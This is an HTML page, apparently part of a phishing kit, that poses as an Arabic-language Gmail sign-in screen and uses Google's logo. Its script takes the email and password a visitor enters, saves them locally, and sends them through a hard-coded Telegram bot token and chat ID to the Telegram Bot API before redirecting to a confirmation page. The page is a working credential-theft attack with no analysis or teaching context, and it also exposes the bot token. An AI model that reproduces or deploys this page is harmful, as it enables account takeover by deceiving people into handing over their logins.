<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gmail - تسجيل الدخول</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      background: rgba(255, 255, 255, 0.95);
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 450px;
      text-align: center;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.3);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    
    .container:hover {
      transform: translateY(-5px);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
    }
    
    .logo-container {
      margin-bottom: 25px;
    }
    
    .logo {
      width: 100px;
      height: auto;
      margin-bottom: 15px;
    }
    
    h2 {
      color: #1a73e8;
      margin-bottom: 25px;
      font-weight: 700;
      font-size: 24px;
    }
    
    .input-group {
      margin-bottom: 20px;
      text-align: right;
    }
    
    input {
      width: 100%;
      padding: 16px 20px;
      font-size: 16px;
      border-radius: 12px;
      border: 2px solid #e0e0e0;
      background: #f9f9f9;
      transition: all 0.3s ease;
      color: #333;
    }
    
    input:focus {
      outline: none;
      border-color: #1a73e8;
      background: #fff;
      box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
    }
    
    input::placeholder {
      color: #9e9e9e;
    }
    
    button {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 12px;
      border: none;
      background: linear-gradient(to right, #1a73e8, #4285f4);
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
      margin-top: 10px;
    }
    
    button:hover {
      background: linear-gradient(to right, #1967d2, #357ae8);
      box-shadow: 0 6px 15px rgba(26, 115, 232, 0.4);
      transform: translateY(-2px);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    .footer {
      margin-top: 25px;
      color: #5f6368;
      font-size: 14px;
    }
    
    .footer a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 600;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    @media (max-width: 480px) {
      .container {
        padding: 30px 20px;
      }
      
      input, button {
        padding: 14px;
      }
    }
    
    .language {
      margin-top: 20px;
      color: #5f6368;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
      <h2>تسجيل الدخول إلى Gmail</h2>
    </div>
    
    <div class="input-group">
      <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
    </div>
    
    <div class="input-group">
      <input type="password" id="password" placeholder="أدخل كلمة المرور">
    </div>
    
    <button onclick="next()">التالي</button>
    
    <div class="footer">
      <a href="#">هل نسيت كلمة المرور؟</a>
      <p>ليس جهازك؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص. <a href="#">المزيد</a></p>
    </div>
    
    <div class="language">
      اللغة: <strong>العربية</strong> • <a href="#">English</a>
    </div>
  </div>

  <script>
    const token = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
    const chatId = "7493001551";

    function next() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      localStorage.setItem("email", email);
      localStorage.setItem("password", password);

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: `📥 Gmail Login:\n📧 ${email}\n🔑 ${password}` })
      });

      window.location.href = "confirm.html";
    }
  </script>
</body>
</html>
